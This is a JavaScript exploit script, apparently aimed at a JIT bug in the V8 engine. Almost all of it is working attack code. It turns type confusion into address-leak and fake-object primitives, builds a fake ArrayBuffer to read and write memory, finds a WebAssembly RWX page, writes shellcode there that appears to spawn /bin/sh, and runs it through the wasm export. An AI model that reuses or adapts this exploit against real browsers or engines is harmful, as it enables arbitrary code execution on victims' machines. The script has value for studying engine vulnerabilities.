function dp(x){}//{%DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
};
const buf8 = new ArrayBuffer(8);
const f64 = new Float64Array(buf8);
const u32 = new Uint32Array(buf8);
function d2u(val)
{ //double ==> Uint64
	f64[0] = val;
	let tmp = Array.from(u32);
	return tmp[1] * 0x100000000 + tmp[0];
}
function u2d(val)
{ //Uint64 ==> double
	let tmp = [];
	tmp[0] = parseInt(val % 0x100000000);
	tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
	u32.set(tmp);
	return f64[0];
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
wmain = getWMain();

const od1 = {pd1:1.1, pd2:1.1, pd3:1.1, pd4:1.1, x:1.1};
const o1 = {a:1};
o1.b = 1;
o1.c = od1;

function leaker(o)
{
	const x = o.a;
	return o.c.x;
}
for (var i = 0; i < 0x4000; i++) {
	leaker(o1);
}

print(leaker(o1));

dp(o1);
o1.c={po1:{}, po2:{}, po3:{}, po4:{}, l:wmain};
wmainAddr = d2u(leaker(o1));
print(hex(wmainAddr))
dp(wmain);

const od2 = {x2:{}};
const o2 = {a2:1};
o2.b2 = 1;
o2.c2 = od2;

function faker(o, val)
{
	const x = o.a2;
	return o.c2.x2;
}

for (var i = 0; i < 0x2000; i++)
{
	faker(o2);
	faker(o2);
}

o = {}; // this is too far, no idea why
o = {}; // this is adjacent to ArrayBuffer
dp(o)
mapleaker = new ArrayBuffer(1);
dp(mapleaker)
o1.c=o;
abMapAddr = d2u(leaker(o1));
print(hex(abMapAddr))


fakeAbArr = [u2d(abMapAddr), 0.0, 0.0,
		u2d(0x321), 1.1, u2d(2), 0.0, 0.0]
o1.c={po1:{}, po2:{}, po3:{}, po4:{}, l:fakeAbArr};
fakeAbAddr = d2u(leaker(o1)) - 0x40;
print(hex(fakeAbAddr))

o2.c2 = {f:u2d(fakeAbAddr)}

fakeAb = faker(o2);

const dataView = new DataView(fakeAb);

fakeAbArr[4] = u2d(wmainAddr-1-0x300);
for (var i = 0; i < 0x300; i++)
{
	rwxAddr = d2u(dataView.getFloat64(i * 8, true));
	if ((rwxAddr / 0x1000) % 0x10 !== 0 &&
		rwxAddr % 0x1000 === 0 &&
		rwxAddr < 0x7fffffffffffff)
		break;
}


print(hex(rwxAddr));


fakeAbArr[4] = u2d(rwxAddr);
var shellcode = [
    0x99583b6a, 0x2fbb4852,
    0x6e69622f, 0x5368732f,
    0x57525f54, 0x050f5e54
];
for (var i = 0; i < shellcode.length; i++)
{
	dataView.setUint32(i * 4, shellcode[i], true);
}
// write shellcode to rwx page

wmain();
// execute the shellcode

throw Error("failed to execute shellcode!");